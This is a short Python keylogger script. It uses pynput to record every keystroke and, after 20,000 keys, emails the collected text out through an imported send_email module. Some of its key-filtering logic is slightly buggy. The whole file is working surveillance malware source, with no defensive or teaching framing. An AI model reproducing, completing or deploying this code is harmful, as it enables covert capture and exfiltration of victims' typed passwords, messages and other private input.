import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def onpress(key):
    print(key, end=" ")
    print("pressed")

    global keys, count

    keys.append(str(key)+"\n")
    count=count+1
    if count>20000:
        count=0
        email(keys)

def email(keys):
    message=""
    for key in keys:
        k=key.replace("'", "")

        if key=="Key.space":
            k=" "
        elif key.find("Key")>0:
            k=""
        message+=k
    
    print(message)
    send_email.sendEmail(message)

def onrelase(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=onpress, on_release=onrelase) as listener:
    listener.join()
